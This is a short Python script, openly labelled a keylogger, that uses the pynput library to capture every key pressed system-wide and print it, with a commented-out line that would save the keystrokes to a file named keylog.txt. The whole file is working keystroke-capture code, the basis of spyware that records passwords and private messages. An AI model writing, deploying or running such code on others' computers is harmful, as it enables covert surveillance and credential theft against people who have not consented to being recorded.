from pynput.keyboard import Key, Listener
import logging
 
# logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
print("Keylogger started")
 
def on_press(key):
    print(str(key))
    # logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()